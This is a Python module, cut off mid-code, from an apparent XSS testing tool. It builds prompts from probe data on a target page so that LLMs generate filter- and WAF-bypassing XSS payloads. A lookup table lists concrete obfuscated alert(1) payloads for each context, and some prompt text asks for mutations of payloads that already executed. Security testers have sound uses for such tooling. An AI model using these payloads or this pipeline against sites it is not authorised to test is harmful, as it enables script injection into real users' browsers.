from __future__ import annotations

import json
import logging
import os
import re
import shutil
import subprocess
from dataclasses import replace
from typing import Any
from urllib.parse import quote_plus

import requests

from ai_xss_generator.behavior import extract_behavior_profile
from ai_xss_generator.findings import (
    Finding,
    infer_bypass_family,
    relevant_findings,
)
from ai_xss_generator.learning import build_memory_profile
from ai_xss_generator.payloads import BASE_PAYLOADS, _match_payloads_to_context, base_payloads_for_context, rank_payloads
from ai_xss_generator.types import ParsedContext, PayloadCandidate, StrategyProfile

log = logging.getLogger(__name__)


OLLAMA_BASE_URL = os.environ.get("OLLAMA_HOST", "http://127.0.0.1:11434").rstrip("/")
OPENAI_BASE_URL = "https://api.openai.com/v1"
OPENROUTER_BASE_URL = "https://openrouter.ai/api/v1"
OPENAI_FALLBACK_MODEL = "gpt-4o-mini"

MODEL_ALIASES = {
    "qwen3.5": [
        "qwen3.5",
        "qwen3.5:9b",
        "qwen3.5:4b",
        "qwen3.5:27b",
        "qwen3.5:35b",
    ],
    "qwen3.5:4b": ["qwen3.5:4b"],
    "qwen3.5:9b": ["qwen3.5:9b", "qwen3.5"],
    "qwen3.5:27b": ["qwen3.5:27b"],
    "qwen3.5:35b": ["qwen3.5:35b"],
    "qwen2.5-coder:7b-instruct-q5_K_M": [
        "qwen2.5-coder:7b-instruct-q5_K_M",
        "qwen2.5-coder:7b-instruct-q5_K_M.gguf",
        "qwen2.5-coder:7b",
    ],
    "qwen2.5-coder:7b-instruct-q5_K_M.gguf": [
        "qwen2.5-coder:7b-instruct-q5_K_M.gguf",
        "qwen2.5-coder:7b-instruct-q5_K_M",
        "qwen2.5-coder:7b",
    ],
}


# ---------------------------------------------------------------------------
# Context extraction helpers
# ---------------------------------------------------------------------------

_STRATEGY_SCHEMA_BLOCK = """      "strategy": {
        "attack_family": "short family label",
        "delivery_mode_hint": "query | fragment | post | multi_param | same_page",
        "encoding_hint": "raw | html_entity | url_encoded | mixed | whitespace_broken | quote_closure",
        "session_hint": "same_page | navigate_then_fire | post_then_sink | authenticated_follow_up",
        "follow_up_hint": "what to try next if this class misses",
        "coordination_hint": "single_param | multi_param | fragment_only | same_tag_pivot"
      },"""

_GENERATION_PHASES = ("scout", "contextual", "research")


def _resolve_generation_phases(
    *,
    deep: bool = False,
    phases: tuple[str, ...] | None = None,
) -> tuple[str, ...]:
    if phases:
        return tuple(phase for phase in phases if phase in _GENERATION_PHASES)
    if deep:
        return _GENERATION_PHASES
    return ("scout",)

def _extract_probe_context(context: ParsedContext) -> tuple[str, str, str]:
    """Return (primary_sink_type, context_type, surviving_chars) from context.

    Reads structured probe notes written by probe.py into context.notes.
    Falls back to the first detected DOM sink when probe data is absent.
    """
    sink_type = context.dom_sinks[0].sink if context.dom_sinks else ""
    context_type = ""
    surviving_chars = ""

    # Prefer injectable SUBCONTEXT notes (structured JSON — avoids repr() escaping issues).
    # A param may reflect in html_body (non-injectable) while a follow-up probe finds
    # html_attr_url(href) as injectable — the injectable context must take priority.
    subctx_prefix = "[probe:SUBCONTEXT] "
    for note in context.notes:
        if not note.startswith(subctx_prefix):
            continue
        try:
            payload = json.loads(note[len(subctx_prefix):])
        except Exception:
            continue
        if not isinstance(payload, dict):
            continue
        if not payload.get("is_injectable"):
            continue
        if not context_type:
            context_type = str(payload.get("context_type") or "")
        if not surviving_chars:
            chars_list = payload.get("surviving_chars") or []
            surviving_chars = "".join(sorted(str(c) for c in chars_list))

    # Fall back: first CONFIRMED note (surviving chars are repr-encoded — parse conservatively)
    if not context_type:
        for note in context.notes:
            m = re.search(r"\[probe:CONFIRMED\].*?→\s*(\w+)", note)
            if m and not context_type:
                context_type = m.group(1)
        # surviving_chars fallback: re-read from SUBCONTEXT JSON for the chosen context
        if context_type:
            for note in context.notes:
                if not note.startswith(subctx_prefix):
                    continue
                try:
                    payload = json.loads(note[len(subctx_prefix):])
                except Exception:
                    continue
                if str(payload.get("context_type") or "") == context_type and not surviving_chars:
                    chars_list = payload.get("surviving_chars") or []
                    surviving_chars = "".join(sorted(str(c) for c in chars_list))

    return sink_type, context_type, surviving_chars


def _extract_dom_runtime_context(context: ParsedContext) -> dict[str, str]:
    """Return DOM runtime taint metadata embedded in context.notes, if present."""
    prefix = "[dom:TAINT] "
    for note in context.notes:
        if not note.startswith(prefix):
            continue
        try:
            payload = json.loads(note[len(prefix):])
        except Exception:
            continue
        return {
            "source_type": str(payload.get("source_type", "")),
            "source_name": str(payload.get("source_name", "")),
            "sink": str(payload.get("sink", "")),
            "code_location": str(payload.get("code_location", "")),
        }
    return {}


def _extract_reflected_subcontext(
    context: ParsedContext,
    desired_context: str = "",
) -> dict[str, Any]:
    """Return the best reflected subcontext note for the current reflected sink."""
    prefix = "[probe:SUBCONTEXT] "
    candidates: list[dict[str, Any]] = []
    for note in context.notes:
        if not note.startswith(prefix):
            continue
        try:
            payload = json.loads(note[len(prefix):])
        except Exception:
            continue
        if not isinstance(payload, dict):
            continue
        candidates.append(payload)

    if not candidates:
        return {}

    desired = desired_context.strip()
    if desired:
        matching = [
            item for item in candidates
            if str(item.get("context_type", "") or "").strip() == desired
        ]
        if matching:
            candidates = matching

    best = candidates[0]
    compact = {
        "context_type": str(best.get("context_type", "") or ""),
        "tag_name": str(best.get("tag_name", "") or ""),
        "attr_name": str(best.get("attr_name", "") or ""),
        "quote_style": str(best.get("quote_style", "") or ""),
        "html_subcontext": str(best.get("html_subcontext", "") or ""),
        "payload_shape": str(best.get("payload_shape", "") or ""),
        "attacker_prefix": str(best.get("attacker_prefix", "") or ""),
        "attacker_suffix": str(best.get("attacker_suffix", "") or ""),
        "explanation": str(best.get("explanation", "") or ""),
        "snippet": str(best.get("snippet", "") or ""),
        "confidence": best.get("confidence", 0.0) or 0.0,
    }
    return {key: value for key, value in compact.items() if value not in ("", [], {}, None)}


def _behavior_profile_section(context: ParsedContext) -> str:
    profile = extract_behavior_profile(context)
    if not profile:
        return ""

    compact = {
        "delivery_mode": profile.get("delivery_mode", ""),
        "waf_name": profile.get("waf_name", ""),
        "browser_required": bool(profile.get("browser_required", False)),
        "auth_required": bool(profile.get("auth_required", False)),
        "frameworks": list(profile.get("frameworks", []) or [])[:4],
        "reflected_params": int(profile.get("reflected_params", 0) or 0),
        "injectable_params": int(profile.get("injectable_params", 0) or 0),
        "reflection_contexts": list(profile.get("reflection_contexts", []) or [])[:6],
        "reflection_transforms": list(profile.get("reflection_transforms", []) or [])[:4],
        "discovery_styles": list(profile.get("discovery_styles", []) or [])[:4],
        "probe_modes": list(profile.get("probe_modes", []) or [])[:4],
        "tested_charsets": list(profile.get("tested_charsets", []) or [])[:4],
        "dom_sources": list(profile.get("dom_sources", []) or [])[:4],
        "dom_sinks": list(profile.get("dom_sinks", []) or [])[:6],
        "observations": list(profile.get("observations", []) or [])[:4],
    }
    return "TARGET BEHAVIOR PROFILE:\n" + json.dumps(compact, indent=2) + "\n"


def _waf_knowledge_data(context: ParsedContext) -> dict[str, Any]:
    profile = getattr(context, "waf_knowledge", None) or {}
    if not profile:
        return {}
    return {
        "engine_name": profile.get("engine_name", ""),
        "confidence": profile.get("confidence", 0.0),
        "normalization": profile.get("normalization", {}),
        "matching": profile.get("matching", {}),
        "likely_pressure_points": list(profile.get("likely_pressure_points", []) or [])[:5],
        "likely_blind_spots": list(profile.get("likely_blind_spots", []) or [])[:5],
        "preferred_strategies": list(profile.get("preferred_strategies", []) or [])[:5],
        "avoid_strategies": list(profile.get("avoid_strategies", []) or [])[:5],
        "notes": list(profile.get("notes", []) or [])[:4],
    }


def _effective_constraints_data(
    context: ParsedContext,
    waf: str | None = None,
    past_lessons: list[Any] | None = None,
) -> dict[str, Any]:
    behavior = extract_behavior_profile(context) or {}
    knowledge = _waf_knowledge_data(context)
    sink_type, context_type, surviving_chars = _extract_probe_context(context)
    dom_runtime = _extract_dom_runtime_context(context)

    observed_blockers: list[str] = []
    if behavior.get("browser_required"):
        observed_blockers.append("browser_required")
    if behavior.get("auth_required"):
        observed_blockers.append("authenticated_state")
    if surviving_chars:
        observed_blockers.append("restricted_surviving_chars")
    if waf:
        observed_blockers.append(f"waf:{waf}")

    observed_transforms = list(behavior.get("reflection_transforms", []) or [])[:4]
    recommended_families = list(knowledge.get("preferred_strategies", []) or [])[:5]
    deprioritized_families = list(knowledge.get("avoid_strategies", []) or [])[:5]
    failed_families: list[str] = []
    strategy_shifts: list[str] = []
    delivery_shifts: list[str] = []
    attempted_delivery_modes: list[str] = []
    edge_blockers: list[str] = []
    delivery_outcomes: list[str] = []
    creative_techniques: list[str] = []

    if past_lessons:
        for lesson in past_lessons:
            if getattr(lesson, "lesson_type", "") != "execution_feedback":
                continue
            metadata = getattr(lesson, "metadata", {}) or {}
            for family in metadata.get("failed_families", []) or []:
                family_text = str(family or "").strip()
                if family_text and family_text not in failed_families:
                    failed_families.append(family_text)
            for shift in metadata.get("strategy_constraints", []) or []:
                shift_text = str(shift or "").strip()
                if shift_text and shift_text not in strategy_shifts:
                    strategy_shifts.append(shift_text)
            for shift in metadata.get("delivery_constraints", []) or []:
                shift_text = str(shift or "").strip()
                if shift_text and shift_text not in delivery_shifts:
                    delivery_shifts.append(shift_text)
            for mode in metadata.get("attempted_delivery_modes", []) or []:
                mode_text = str(mode or "").strip()
                if mode_text and mode_text not in attempted_delivery_modes:
                    attempted_delivery_modes.append(mode_text)
            for blocker in metadata.get("edge_blockers", []) or []:
                blocker_text = str(blocker or "").strip()
                if blocker_text and blocker_text not in edge_blockers:
                    edge_blockers.append(blocker_text)
            for outcome in metadata.get("delivery_outcomes", []) or []:
                outcome_text = str(outcome or "").strip()
                if outcome_text and outcome_text not in delivery_outcomes:
                    delivery_outcomes.append(outcome_text)

    if context_type == "html_attr_url":
        if "scheme_fragmentation" not in recommended_families:
            recommended_families.append("scheme_fragmentation")
        creative_techniques.extend([
            "split or fragment URL delivery when query-only delivery keeps missing",
            "entity-encoded or whitespace-broken scheme shaping",
        ])
    if context_type in {"html_attr_value", "html_body"} or dom_runtime.get("sink") == "document.write":
        if "quote_closure" not in recommended_families:
            recommended_families.append("quote_closure")
        creative_techniques.append("same-tag attribute pivots before broad full-tag escapes")
    if surviving_chars and "<" not in surviving_chars and "plain_script_tag" not in deprioritized_families:
        deprioritized_families.append("plain_script_tag")
    if observed_transforms and "mixed_case_markup" not in recommended_families:
        recommended_families.append("mixed_case_markup")
        creative_techniques.append("numeric/entity-encoded alpha or other case-agnostic markup shaping")
    if knowledge.get("normalization", {}).get("html_entity_decode") is False:
        creative_techniques.append("HTML numeric/entity encoding when raw tokens are high-pressure")
    if knowledge.get("normalization", {}).get("unicode_escape_decode") is False:
        creative_techniques.append("Unicode-width or escaped-token variants only when the sink/parser plausibly preserves them")
    for family in failed_families:
        if family not in deprioritized_families:
            deprioritized_families.append(family)

    deduped_creative: list[str] = []
    for item in creative_techniques:
        if item not in deduped_creative:
            deduped_creative.append(item)

    return {
        "confirmed_sink": sink_type or dom_runtime.get("sink", ""),
        "reflection_context": context_type or "",
        "observed_blockers": observed_blockers[:5],
        "observed_transforms": observed_transforms,
        "recommended_families": recommended_families[:5],
        "deprioritized_families": deprioritized_families[:5],
        "edge_blockers": edge_blockers[:5],
        "delivery_outcomes": delivery_outcomes[:5],
        "attempted_delivery_modes": attempted_delivery_modes[:4],
        "required_strategy_shifts": strategy_shifts[:4],
        "required_delivery_shifts": delivery_shifts[:4],
        "creative_techniques": deduped_creative[:4],
    }


def _execution_feedback_data(past_lessons: list[Any] | None) -> dict[str, Any]:
    if not past_lessons:
        return {}

    failed_families: list[str] = []
    strategy_constraints: list[str] = []
    delivery_constraints: list[str] = []
    attempted_delivery_modes: list[str] = []
    edge_blockers: list[str] = []
    delivery_outcomes: list[str] = []
    duplicate_payloads: list[str] = []
    observations: list[str] = []

    def _extend_unique(target: list[str], values: list[Any], limit: int) -> None:
        for value in values:
            text = str(value or "").strip()
            if text and text not in target:
                target.append(text)
            if len(target) >= limit:
                break

    for lesson in past_lessons:
        if getattr(lesson, "lesson_type", "") != "execution_feedback":
            continue
        metadata = getattr(lesson, "metadata", {}) or {}
        _extend_unique(failed_families, metadata.get("failed_families", []) or [], 5)
        _extend_unique(strategy_constraints, metadata.get("strategy_constraints", []) or [], 5)
        _extend_unique(delivery_constraints, metadata.get("delivery_constraints", []) or [], 5)
        _extend_unique(attempted_delivery_modes, metadata.get("attempted_delivery_modes", []) or [], 5)
        _extend_unique(edge_blockers, metadata.get("edge_blockers", []) or [], 5)
        _extend_unique(delivery_outcomes, metadata.get("delivery_outcomes", []) or [], 5)
        _extend_unique(duplicate_payloads, metadata.get("duplicate_payloads", []) or [], 4)
        observation = str(metadata.get("observation", "") or "").strip()
        if observation and observation not in observations:
            observations.append(observation)
        if len(observations) >= 2:
            break

    if not any((failed_families, strategy_constraints, delivery_constraints, attempted_delivery_modes, edge_blockers, delivery_outcomes, duplicate_payloads, observations)):
        return {}

    return {
        "failed_families": failed_families[:5],
        "strategy_shifts": strategy_constraints[:5],
        "delivery_shifts": delivery_constraints[:5],
        "attempted_delivery_modes": attempted_delivery_modes[:5],
        "edge_blockers": edge_blockers[:5],
        "delivery_outcomes": delivery_outcomes[:5],
        "duplicate_payloads": duplicate_payloads[:4],
        "observations": observations[:2],
    }


def _context_envelope(
    context: ParsedContext,
    waf: str | None = None,
    *,
    compact: bool = False,
) -> dict[str, Any]:
    sink_type, context_type, surviving_chars = _extract_probe_context(context)
    dom_runtime = _extract_dom_runtime_context(context)
    reflected_subcontext = _extract_reflected_subcontext(context, desired_context=context_type)
    behavior = extract_behavior_profile(context) or {}
    if compact:
        compact_envelope = {
            "waf_hint": waf or behavior.get("waf_name", ""),
            "frameworks": list(context.frameworks[:3]),
            "reflection_transforms": list(behavior.get("reflection_transforms", []) or [])[:3],
        }
        return {
            key: value
            for key, value in compact_envelope.items()
            if value not in ("", [], {}, None, False)
        }
    envelope: dict[str, Any] = {
        "target_url": context.source,
        "delivery_mode": behavior.get("delivery_mode", ""),
        "primary_sink": sink_type or dom_runtime.get("sink", ""),
        "reflection_context": context_type,
        "surviving_special_chars": surviving_chars,
        "reflection_transforms": list(behavior.get("reflection_transforms", []) or [])[:3],
        "probe_modes": list(behavior.get("probe_modes", []) or [])[:2],
        "discovery_styles": list(behavior.get("discovery_styles", []) or [])[:2],
        "browser_required": bool(behavior.get("browser_required", False)),
        "auth_required": bool(behavior.get("auth_required", False)),
        "frameworks": list(context.frameworks[:3]),
        "waf_hint": waf or behavior.get("waf_name", ""),
    }
    if dom_runtime:
        envelope["dom_runtime"] = dom_runtime
        if (dom_runtime.get("sink") or "").strip().lower() == "document.write":
            envelope["dom_subcontext"] = _document_write_subcontext(context)
    elif reflected_subcontext:
        envelope["reflected_subcontext"] = reflected_subcontext
    return {key: value for key, value in envelope.items() if value not in ("", [], {}, None, False)}


def _planning_envelope(
    context: ParsedContext,
    waf: str | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
) -> dict[str, Any]:
    effective = _effective_constraints_data(context, waf=waf, past_lessons=past_lessons)
    waf_knowledge = _waf_knowledge_data(context)
    envelope = {
        "primary_families": list(effective.get("recommended_families", []) or [])[:3],
        "avoid_families": list(effective.get("deprioritized_families", []) or [])[:4],
        "observed_blockers": list(effective.get("observed_blockers", []) or [])[:4],
        "observed_transforms": list(effective.get("observed_transforms", []) or [])[:3],
        "delivery_modes_in_play": list(effective.get("attempted_delivery_modes", []) or [])[:3],
        "delivery_outcomes": list(effective.get("delivery_outcomes", []) or [])[:3],
        "required_strategy_shifts": list(effective.get("required_strategy_shifts", []) or [])[:3],
        "required_delivery_shifts": list(effective.get("required_delivery_shifts", []) or [])[:3],
        "creative_techniques": list(effective.get("creative_techniques", []) or [])[:3],
    }
    hint = str(strategy_hint or "").strip()
    if hint:
        envelope["strategy_hint"] = hint
    if waf_knowledge:
        envelope["waf_prior"] = {
            "engine_name": waf_knowledge.get("engine_name", ""),
            "preferred_strategies": list(waf_knowledge.get("preferred_strategies", []) or [])[:3],
            "avoid_strategies": list(waf_knowledge.get("avoid_strategies", []) or [])[:3],
        }
    return {key: value for key, value in envelope.items() if value not in ("", [], {}, None)}


def _failure_envelope(past_lessons: list[Any] | None) -> dict[str, Any]:
    feedback = _execution_feedback_data(past_lessons)
    if not feedback:
        return {}
    envelope = {
        "failed_families": list(feedback.get("failed_families", []) or [])[:4],
        "attempted_delivery_modes": list(feedback.get("attempted_delivery_modes", []) or [])[:4],
        "edge_blockers": list(feedback.get("edge_blockers", []) or [])[:4],
        "delivery_outcomes": list(feedback.get("delivery_outcomes", []) or [])[:4],
        "duplicate_payloads": list(feedback.get("duplicate_payloads", []) or [])[:3],
        "observations": list(feedback.get("observations", []) or [])[:2],
    }
    return {key: value for key, value in envelope.items() if value not in ("", [], {}, None)}


def _context_envelope_section(
    context: ParsedContext,
    waf: str | None = None,
    *,
    compact: bool = False,
) -> str:
    return (
        "CONTEXT ENVELOPE:\n"
        + json.dumps(_context_envelope(context, waf=waf, compact=compact), indent=2)
        + "\n"
    )


def _planning_envelope_section(
    context: ParsedContext,
    waf: str | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
) -> str:
    return (
        "PLANNING ENVELOPE:\n"
        + json.dumps(
            _planning_envelope(
                context,
                waf=waf,
                past_lessons=past_lessons,
                strategy_hint=strategy_hint,
            ),
            indent=2,
        )
        + "\n"
    )


def _failure_envelope_section(past_lessons: list[Any] | None) -> str:
    envelope = _failure_envelope(past_lessons)
    if not envelope:
        return ""
    return "FAILURE ENVELOPE:\n" + json.dumps(envelope, indent=2) + "\n"


def _success_envelope(past_lessons: list[Any] | None) -> list[dict[str, str]]:
    successful: list[dict[str, str]] = []
    seen_payloads: set[str] = set()
    for lesson in past_lessons or []:
        metadata = getattr(lesson, "metadata", {}) or {}
        if not (metadata.get("execution_confirmed") or metadata.get("confirmed_execution")):
            continue
        payload = str(metadata.get("payload", "") or "").strip()
        if not payload or payload in seen_payloads:
            continue
        seen_payloads.add(payload)
        family = str(metadata.get("bypass_family", "") or "").strip()
        item = {"payload": payload}
        if family:
            item["bypass_family"] = family
        successful.append(item)
        if len(successful) >= 5:
            break
    return successful


def _success_envelope_section(past_lessons: list[Any] | None) -> str:
    envelope = _success_envelope(past_lessons)
    if not envelope:
        return ""
    return (
        "PAYLOADS THAT EXECUTED - generate similar techniques but NOT identical:\n"
        + json.dumps(envelope, indent=2)
        + "\n"
    )


def _payload_item_field(item: Any, field: str, default: Any = "") -> Any:
    if hasattr(item, field):
        return getattr(item, field, default)
    if isinstance(item, dict):
        return item.get(field, default)
    if field == "payload":
        return item
    return default


def _reference_payload_examples(
    reference_payloads: list[Any] | None,
    *,
    limit: int = 5,
) -> list[dict[str, Any]]:
    examples: list[dict[str, Any]] = []
    seen_payloads: set[str] = set()
    for item in reference_payloads or []:
        payload = str(_payload_item_field(item, "payload", "") or "").strip()
        if not payload or payload in seen_payloads:
            continue
        seen_payloads.add(payload)
        tags = [
            str(tag).strip()
            for tag in (_payload_item_field(item, "tags", []) or [])
            if str(tag).strip()
        ]
        bypass_family = str(_payload_item_field(item, "bypass_family", "") or "").strip()
        if not bypass_family and tags:
            bypass_family = infer_bypass_family(payload, tags)
        example = {"payload": payload}
        if bypass_family:
            example["bypass_family"] = bypass_family
        if tags:
            example["tags"] = tags[:4]
        examples.append(example)
        if len(examples) >= limit:
            break
    return examples


def _merged_reference_payloads(
    reference_payloads: list[Any] | None,
    past_lessons: list[Any] | None,
) -> list[Any] | None:
    merged: list[Any] = []
    merged.extend(_success_envelope(past_lessons))
    merged.extend(reference_payloads or [])
    if not merged:
        return None

    deduped: list[Any] = []
    seen_payloads: set[str] = set()
    for item in merged:
        payload = str(_payload_item_field(item, "payload", "") or "").strip()
        if not payload or payload in seen_payloads:
            continue
        seen_payloads.add(payload)
        deduped.append(item)
    return deduped or None


def _normalized_context_label(context_type: str) -> str:
    normalized = (context_type or "").strip().lower()
    if normalized.startswith("html_body"):
        return "html_body"
    if normalized.startswith("html_attr_value"):
        return "html_attr_value"
    if normalized.startswith("html_attr_url"):
        return "html_attr_url"
    if normalized.startswith("js_string_dq"):
        return "js_string_dq"
    if normalized.startswith("js_string_sq"):
        return "js_string_sq"
    if normalized.startswith("js_code"):
        return "js_code"
    if normalized.startswith("html_comment"):
        return "html_comment"
    return normalized


def _similar_findings_examples(
    past_findings: list[Finding] | None,
    *,
    context_type: str,
    limit: int = 5,
) -> list[dict[str, str]]:
    if not past_findings:
        return []

    normalized_context = _normalized_context_label(context_type)
    scored: list[tuple[int, Finding]] = []
    seen_payloads: set[str] = set()
    for finding in past_findings:
        payload = str(finding.payload or "").strip()
        if not payload or payload in seen_payloads:
            continue
        seen_payloads.add(payload)

        finding_context = _normalized_context_label(finding.context_type)
        score = 0
        if finding_context == normalized_context:
            score += 4
        elif normalized_context and finding_context and normalized_context.split("_", 1)[0] == finding_context.split("_", 1)[0]:
            score += 2
        if finding.explanation:
            score += 1
        if finding.bypass_family:
            score += 1
        scored.append((score, finding))

    scored.sort(key=lambda item: (-item[0], -item[1].confidence, item[1].payload))
    return [
        {
            "payload": finding.payload,
            "bypass_family": finding.bypass_family,
            "context_type": finding.context_type,
            "why_it_works": finding.explanation,
        }
        for _, finding in scored[:limit]
    ]


_OBFUSCATION_TECHNIQUES: dict[str, str] = {
    "html_body": (
        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
        "- Uncommon tags: <details open ontoggle=...>, <video onloadstart=...>, <svg onload=...>, <marquee onstart=...>\n"
        "- Case/space variants: <ImG sRc=x OnErRoR=alert(1)>, unquoted attributes\n"
        "- Mutation XSS (mXSS): </sty</style>le><img ...>, <listing><img ...></listing> — parser re-parses mangled markup\n"
        "- Namespace confusion: SVG/MathML as context escapes — </p><svg><script>, <math><mtext><img ...>\n"
        "- CSS context escape: </style><img src=x onerror=alert(1)>\n"
        "- Encoded attribute names: &#x6f;nerror, &#111;nerror\n"
    ),
    "html_attr_value": (
        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
        "- Attribute breakout: close the quote, inject handler — \" onmouseover=alert(1) x=\"\n"
        "- Angle-bracket-free: stay inside the attribute, no < > needed — works when angle brackets are stripped\n"
        "- Autofocus gadget: \" autofocus onfocus=alert(1) x=\" — fires on load, no click\n"
        "- Case variants on handlers: OnMoUsEoVeR=, oNfOcUs=, OnInPuT=\n"
        "- Entity-encoded quotes: &#x22; or &quot; to bypass quote filters\n"
    ),
    "html_attr_url": (
        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
        "- javascript: URI variants: jaVasCript:, java\\tscript: (tab in scheme)\n"
        "- Leading whitespace bypass: \\x09javascript:, \\x0ajavascript:\n"
        "- data: URI fallback: data:text/html,<script>alert(1)</script>\n"
        "- Attribute breakout if quote survives: \" onmouseover=alert(1) href=\"#\n"
        "- HTML entity in URL: &#106;avascript:\n"
    ),
    "js_string_dq": (
        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
        "- Quote breakout: \\\"; to escape the double-quoted string\n"
        "- Keyword splitting: 'al'+'ert'(1), top['al'+'ert'](1)\n"
        "- Unicode function names: \\u0061lert(1), \\x61lert(1)\n"
        "- Constructor chain: []['filter']['constructor']('alert(1)')()\n"
        "- Nested template literal: `${`${alert(1)}`}` if backtick context is reachable\n"
    ),
    "js_string_sq": (
        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
        "- Quote breakout: '; to escape the single-quoted string\n"
        "- Keyword splitting: 'al'+'ert'(1), window['al'+'ert'](1)\n"
        "- Unicode function names: \\u0061lert(1), \\x61lert(1)\n"
        "- Constructor chain: []['filter']['constructor']('alert(1)')()\n"
        "- Nested template literal: `${`${alert(1)}`}` if backtick context is reachable\n"
    ),
    "js_code": (
        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
        "- Function constructor: Function('alert(1)')()\n"
        "- Indirect eval: (0,eval)('alert(1)')\n"
        "- Tagged template literal: Set.constructor`alert\\x281\\x29`()\n"
        "- Prototype gadget: []['filter']['constructor']('alert(1)')()\n"
        "- Unicode/hex function names: \\u0061lert, \\x61lert\n"
        "- Nested template: `${`${alert(1)}`}`\n"
    ),
    "html_comment": (
        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
        "- Comment close breakout: --> or --!>\n"
        "- Malformed comment escape: --><img src=x onerror=alert(1)>\n"
    ),
}

_OBFUSCATION_TECHNIQUES_FALLBACK = (
    "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
    "- HTML tag injection: SVG, MathML, uncommon HTML5 elements\n"
    "- Encoding variants: HTML entities, Unicode escapes, URL percent-encoding\n"
    "- Angle-bracket-free event handlers for attribute contexts\n"
    "- Constructor/prototype gadgets for JS execution contexts\n"
)


def _obfuscation_techniques_section(context_type: str) -> str:
    normalized = _normalized_context_label(context_type)
    return _OBFUSCATION_TECHNIQUES.get(normalized, _OBFUSCATION_TECHNIQUES_FALLBACK)


def _application_signals_section(
    context_type: str,
    surviving_chars: str,
    waf: str | None,
    past_lessons: list[Any] | None,
    strategy_hint: str | None,
    context: "ParsedContext | None" = None,
) -> str:
    """Focused application observations for deep mode — replaces fat planning/context envelopes."""
    lines = [
        f"Reflection context: {context_type or 'unknown'}",
        f"Surviving chars: {surviving_chars or '(none confirmed)'}",
    ]
    if waf:
        lines.append(f"WAF/filter: {waf}")

    feedback = _execution_feedback_data(past_lessons)
    if feedback:
        blockers = [str(b) for b in (feedback.get("edge_blockers") or [])[:3] if b]
        if blockers:
            lines.append(f"Observed blockers: {', '.join(blockers)}")
        outcomes = [str(o) for o in (feedback.get("delivery_outcomes") or [])[:2] if o]
        if outcomes:
            lines.append(f"Filter responses: {', '.join(outcomes)}")

    # href/formaction bypass: when html_attr_url context has < surviving, the
    # injection is in HTML body and needs a full <a href=javascript:> or
    # <button formaction=javascript:> tag — NOT just a bare javascript: URI.
    if context_type == "html_attr_url" and "<" in (surviving_chars or ""):
        lines.append(
            "INJECTION SHAPE: The parameter is reflected in the HTML BODY, not directly "
            "inside an existing attribute. The sanitizer strips event handlers (onerror, "
            "ontoggle, onload, etc.) but allows javascript: URIs in href/formaction. "
            "INJECT A FULL TAG such as: "
            '<a href="javascript:alert(1)">x</a> or '
            '<button formaction="javascript:alert(1)">x</button>. '
            "Do NOT inject a bare URI — it will render as plain text."
        )

    section = "WHAT WE KNOW ABOUT THIS APPLICATION:\n"
    section += "\n".join(f"  {line}" for line in lines) + "\n"

    # Include reflection structure and DOM runtime if available — high-value for targeted payloads
    if context is not None:
        dom_runtime = _extract_dom_runtime_context(context)
        if dom_runtime:
            section += "DOM RUNTIME:\n" + json.dumps(dom_runtime, indent=2) + "\n"
        else:
            reflected_subcontext = _extract_reflected_subcontext(context, desired_context=context_type)
            if reflected_subcontext:
                section += "REFLECTION STRUCTURE:\n" + json.dumps(reflected_subcontext, indent=2) + "\n"

    observations = [str(o) for o in (feedback.get("observations") or [])[:2] if o] if feedback else []
    if observations:
        section += "OBSERVED BEHAVIOUR:\n"
        section += "\n".join(f"  - {obs}" for obs in observations) + "\n"

    hint = str(strategy_hint or "").strip()
    if hint:
        section += f"STRATEGY NOTE: {hint}\n"

    return section


def _similar_findings_section(
    past_findings: list[Finding] | None,
    *,
    context_type: str,
    limit: int = 5,
) -> str:
    examples = _similar_findings_examples(
        past_findings,
        context_type=context_type,
        limit=limit,
    )
    if not examples:
        return ""
    return (
        "PAYLOADS THAT EXECUTED IN SIMILAR CONTEXTS (use as inspiration, mutate don't copy):\n"
        + json.dumps(examples, indent=2)
        + "\n"
    )


def _seed_examples_for_context(
    *,
    context_type: str,
    surviving_chars: str,
    reference_payloads: list[Any] | None,
    waf: str | None = None,
) -> list[dict[str, Any]]:
    # External reference payloads (e.g. from --public) take priority — they
    # are already curated by the caller and represent the most relevant examples.
    reference_examples = _reference_payload_examples(reference_payloads, limit=5)
    if reference_examples:
        return reference_examples

    # Multi-tier seed pool: bootstrap (always) + survived WAF bypass + confirmed
    # This is the primary seed source for every scan.
    try:
        from ai_xss_generator.seed_pool import SeedPool
        pool = SeedPool()
        pool_seeds = pool.select_seeds(context_type, waf=waf, n=6)
        if pool_seeds:
            return pool_seeds
    except Exception:
        pass

    # Final fallback: static BASE_PAYLOADS (older path, still useful if pool
    # fails to load for any reason)
    seeds = _match_payloads_to_context(list(BASE_PAYLOADS), context_type, surviving_chars)
    return [
        {
            "payload": payload.payload,
            "bypass_family": payload.bypass_family or infer_bypass_family(payload.payload, payload.tags),
            "tags": payload.tags[:4],
        }
        for payload in seeds
    ]


def _seed_examples_section(
    *,
    context_type: str,
    surviving_chars: str,
    reference_payloads: list[Any] | None,
    waf: str | None = None,
) -> str:
    examples = _seed_examples_for_context(
        context_type=context_type,
        surviving_chars=surviving_chars,
        reference_payloads=reference_payloads,
        waf=waf,
    )
    if not examples:
        return ""
    return "SEED PAYLOADS (mutate, do not copy):\n" + json.dumps(examples, indent=2) + "\n"


def _generation_output_schema(phase: str) -> dict[str, Any]:
    if phase == "scout":
        return {
            "type": "object",
            "properties": {
                "payloads": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "payload": {"type": "string"},
                            "title": {"type": "string"},
                            "test_vector": {"type": "string"},
                            "bypass_family": {"type": "string"},
                        },
                        "required": ["payload", "title", "test_vector", "bypass_family"],
                        "additionalProperties": False,
                    },
                },
            },
            "required": ["payloads"],
            "additionalProperties": False,
        }
    if phase == "contextual":
        return {
            "type": "object",
            "properties": {
                "payloads": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "payload": {"type": "string"},
                            "title": {"type": "string"},
                            "explanation": {"type": "string"},
                            "test_vector": {"type": "string"},
                            "tags": {
                                "type": "array",
